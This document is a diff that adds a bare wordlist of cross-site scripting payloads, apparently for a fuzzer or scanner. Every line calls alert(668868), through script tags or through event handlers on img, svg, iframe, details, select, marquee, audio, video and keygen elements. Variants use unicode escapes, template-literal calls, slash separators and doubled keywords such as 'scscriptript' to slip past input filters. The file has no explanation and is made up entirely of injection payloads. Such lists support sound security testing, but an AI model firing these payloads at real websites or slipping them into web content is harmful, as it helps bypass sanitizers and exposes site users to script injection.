@@ -1,0 +1,154 @@
+<script>alert(668868);</script>
+<script>alert(668868);</script>
+<script>alert`668868`;</script>
+<script>\u0061\u006c\u0065\u0072\u0074(668868);</script>
+<script>\u0061\u006c\u0065\u0072\u0074(668868);</script>
+<script>\u0061\u006c\u0065\u0072\u0074`668868`;</script>
+<script>\u0061\u006c\u0065\u0072\u0074`668868`;</script>
+<scscriptript>alert(668868);</scscriptript>
+<scscriptript>alert(668868);</scscriptript>
+<scscriptript>alert`668868`;</scscriptript>
+<scscriptript>\u0061\u006c\u0065\u0072\u0074(668868);</scscriptript>
+<scscriptript>\u0061\u006c\u0065\u0072\u0074(668868);</scscriptript>
+<scscriptript>\u0061\u006c\u0065\u0072\u0074`668868`;</scscriptript>
+<scscriptript>\u0061\u006c\u0065\u0072\u0074`668868`;</scscriptript>
+<img src="1" onerror=alert(668868)>
+<img/src="1"/onerror=alert(668868)>
+<img src="1" onerror=alert`668868`>
+<img/src="1"/onerror=\u0061\u006c\u0065\u0072\u0074(668868)>
+<img src="1" onerror=\u0061\u006c\u0065\u0072\u0074(668868)>
+<img/src="1"/onerror=\u0061\u006c\u0065\u0072\u0074`668868`>
+<img src="1" onerror=\u0061\u006c\u0065\u0072\u0074`668868`>
+<img src="1" onerror=alert(668868)>
+<img/src="1"/onerror=alert(668868)>
+<img src="1" onerror=alert`668868`>
+<img/src="1"/onerror=\u0061\u006c\u0065\u0072\u0074(668868)>
+<img src="1" onerror=\u0061\u006c\u0065\u0072\u0074(668868)>
+<img/src="1"/onerror=\u0061\u006c\u0065\u0072\u0074`668868`>
+<img src="1" onerror=\u0061\u006c\u0065\u0072\u0074`668868`>
+<svg onload=alert(668868)>
+<svg/onload=alert(668868)>
+<svg onload=alert`668868`>
+<svg/onload=\u0061\u006c\u0065\u0072\u0074(668868)>
+<svg onload=\u0061\u006c\u0065\u0072\u0074(668868)>
+<svg/onload=\u0061\u006c\u0065\u0072\u0074`668868`>
+<svg onload=\u0061\u006c\u0065\u0072\u0074`668868`>
+<svg onload=alert(668868)>
+<svg/onload=alert(668868)>
+<svg onload=alert`668868`>
+<svg/onload=\u0061\u006c\u0065\u0072\u0074(668868)>
+<svg onload=\u0061\u006c\u0065\u0072\u0074(668868)>
+<svg/onload=\u0061\u006c\u0065\u0072\u0074`668868`>
+<svg onload=\u0061\u006c\u0065\u0072\u0074`668868`>
+<iframe src="http://baidu.com" onload=alert(668868)></iframe>
+<iframe/src="http://baidu.com"/onload=alert(668868)></iframe>
+<iframe src="http://baidu.com" onload=alert`668868`></iframe>
+<iframe/src="http://baidu.com"/onload=\u0061\u006c\u0065\u0072\u0074(668868)></iframe>
+<iframe src="http://baidu.com" onload=\u0061\u006c\u0065\u0072\u0074(668868)></iframe>
+<iframe/src="http://baidu.com"/onload=\u0061\u006c\u0065\u0072\u0074`668868`></iframe>
+<iframe src="http://baidu.com" onload=\u0061\u006c\u0065\u0072\u0074`668868`></iframe>
+<iframe src="http://baidu.com" onload=alert(668868)></iframe>
+<iframe/src="http://baidu.com"/onload=alert(668868)></iframe>
+<iframe src="http://baidu.com" onload=alert`668868`></iframe>
+<iframe/src="http://baidu.com"/onload=\u0061\u006c\u0065\u0072\u0074(668868)></iframe>
+<iframe src="http://baidu.com" onload=\u0061\u006c\u0065\u0072\u0074(668868)></iframe>
+<iframe/src="http://baidu.com"/onload=\u0061\u006c\u0065\u0072\u0074`668868`></iframe>
+<iframe src="http://baidu.com" onload=\u0061\u006c\u0065\u0072\u0074`668868`></iframe>
+<details open ontoggle="alert(668868)">
+<details/open/ontoggle="alert(668868)">
+<details open ontoggle="alert`668868`">
+<details/open/ontoggle="\u0061\u006c\u0065\u0072\u0074(668868)">
+<details open ontoggle="\u0061\u006c\u0065\u0072\u0074(668868)">
+<details/open/ontoggle="\u0061\u006c\u0065\u0072\u0074`668868`">
+<details open ontoggle="\u0061\u006c\u0065\u0072\u0074`668868`">
+<details open ontoggle="alert(668868)">
+<details/open/ontoggle="alert(668868)">
+<details open ontoggle="alert`668868`">
+<details/open/ontoggle="\u0061\u006c\u0065\u0072\u0074(668868)">
+<details open ontoggle="\u0061\u006c\u0065\u0072\u0074(668868)">
+<details/open/ontoggle="\u0061\u006c\u0065\u0072\u0074`668868`">
+<details open ontoggle="\u0061\u006c\u0065\u0072\u0074`668868`">
+<select autofocus onfocus=alert(668868)>
+<select/autofocus/onfocus=alert(668868)>
+<select autofocus onfocus=alert`668868`>
+<select/autofocus/onfocus=\u0061\u006c\u0065\u0072\u0074(668868)>
+<select autofocus onfocus=\u0061\u006c\u0065\u0072\u0074(668868)>
+<select/autofocus/onfocus=\u0061\u006c\u0065\u0072\u0074`668868`>
+<select autofocus onfocus=\u0061\u006c\u0065\u0072\u0074`668868`>
+<select autofocus onfocus=alert(668868)>
+<select/autofocus/onfocus=alert(668868)>
+<select autofocus onfocus=alert`668868`>
+<select/autofocus/onfocus=\u0061\u006c\u0065\u0072\u0074(668868)>
+<select autofocus onfocus=\u0061\u006c\u0065\u0072\u0074(668868)>
+<select/autofocus/onfocus=\u0061\u006c\u0065\u0072\u0074`668868`>
+<select autofocus onfocus=\u0061\u006c\u0065\u0072\u0074`668868`>
+<marquee onstart=alert(668868)>
+<marquee/onstart=alert(668868)>
+<marquee onstart=alert`668868`>
+<marquee/onstart=\u0061\u006c\u0065\u0072\u0074(668868)>
+<marquee onstart=\u0061\u006c\u0065\u0072\u0074(668868)>
+<marquee/onstart=\u0061\u006c\u0065\u0072\u0074`668868`>
+<marquee onstart=\u0061\u006c\u0065\u0072\u0074`668868`>
+<marquee onstart=alert(668868)>
+<marquee/onstart=alert(668868)>
+<marquee onstart=alert`668868`>
+<marquee/onstart=\u0061\u006c\u0065\u0072\u0074(668868)>
+<marquee onstart=\u0061\u006c\u0065\u0072\u0074(668868)>
+<marquee/onstart=\u0061\u006c\u0065\u0072\u0074`668868`>
+<marquee onstart=\u0061\u006c\u0065\u0072\u0074`668868`>
+<audio src onloadstart=alert(668868)
+<audio/src/onloadstart=alert(668868)
+<audio src onloadstart=alert`668868`
+<audio/src/onloadstart=\u0061\u006c\u0065\u0072\u0074(668868)
+<audio src onloadstart=\u0061\u006c\u0065\u0072\u0074(668868)
+<audio/src/onloadstart=\u0061\u006c\u0065\u0072\u0074`668868`
+<audio src onloadstart=\u0061\u006c\u0065\u0072\u0074`668868`
+<audio src onloadstart=alert(668868)
+<audio/src/onloadstart=alert(668868)
+<audio src onloadstart=alert`668868`
+<audio/src/onloadstart=\u0061\u006c\u0065\u0072\u0074(668868)
+<audio src onloadstart=\u0061\u006c\u0065\u0072\u0074(668868)
+<audio/src/onloadstart=\u0061\u006c\u0065\u0072\u0074`668868`
+<audio src onloadstart=\u0061\u006c\u0065\u0072\u0074`668868`
+<video src="_" onloadstart="alert(668868)">
+<video/src="_"/onloadstart="alert(668868)">
+<video src="_" onloadstart="alert`668868`">
+<video/src="_"/onloadstart="\u0061\u006c\u0065\u0072\u0074(668868)">
+<video src="_" onloadstart="\u0061\u006c\u0065\u0072\u0074(668868)">
+<video/src="_"/onloadstart="\u0061\u006c\u0065\u0072\u0074`668868`">
+<video src="_" onloadstart="\u0061\u006c\u0065\u0072\u0074`668868`">
+<video src="_" onloadstart="alert(668868)">
+<video/src="_"/onloadstart="alert(668868)">
+<video src="_" onloadstart="alert`668868`">
+<video/src="_"/onloadstart="\u0061\u006c\u0065\u0072\u0074(668868)">
+<video src="_" onloadstart="\u0061\u006c\u0065\u0072\u0074(668868)">
+<video/src="_"/onloadstart="\u0061\u006c\u0065\u0072\u0074`668868`">
+<video src="_" onloadstart="\u0061\u006c\u0065\u0072\u0074`668868`">
+<video><source onerror="javascript:alert(668868)">
+<video><source/onerror="javascript:alert(668868)">
+<video><source onerror="javascript:alert`668868`">
+<video><source/onerror="javascript:\u0061\u006c\u0065\u0072\u0074(668868)">
+<video><source onerror="javascript:\u0061\u006c\u0065\u0072\u0074(668868)">
+<video><source/onerror="javascript:\u0061\u006c\u0065\u0072\u0074`668868`">
+<video><source onerror="javascript:\u0061\u006c\u0065\u0072\u0074`668868`">
+<video><source onerror="javascscriptript:alert(668868)">
+<video><source/onerror="javascscriptript:alert(668868)">
+<video><source onerror="javascscriptript:alert`668868`">
+<video><source/onerror="javascscriptript:\u0061\u006c\u0065\u0072\u0074(668868)">
+<video><source onerror="javascscriptript:\u0061\u006c\u0065\u0072\u0074(668868)">
+<video><source/onerror="javascscriptript:\u0061\u006c\u0065\u0072\u0074`668868`">
+<video><source onerror="javascscriptript:\u0061\u006c\u0065\u0072\u0074`668868`">
+<keygen autofocus onfocus=alert(668868)>
+<keygen/autofocus/onfocus=alert(668868)>
+<keygen autofocus onfocus=alert`668868`>
+<keygen/autofocus/onfocus=\u0061\u006c\u0065\u0072\u0074(668868)>
+<keygen autofocus onfocus=\u0061\u006c\u0065\u0072\u0074(668868)>
+<keygen/autofocus/onfocus=\u0061\u006c\u0065\u0072\u0074`668868`>
+<keygen autofocus onfocus=\u0061\u006c\u0065\u0072\u0074`668868`>
+<keygen autofocus onfocus=alert(668868)>
+<keygen/autofocus/onfocus=alert(668868)>
+<keygen autofocus onfocus=alert`668868`>
+<keygen/autofocus/onfocus=\u0061\u006c\u0065\u0072\u0074(668868)>
+<keygen autofocus onfocus=\u0061\u006c\u0065\u0072\u0074(668868)>
+<keygen/autofocus/onfocus=\u0061\u006c\u0065\u0072\u0074`668868`>
+<keygen autofocus onfocus=\u0061\u006c\u0065\u0072\u0074`668868`>
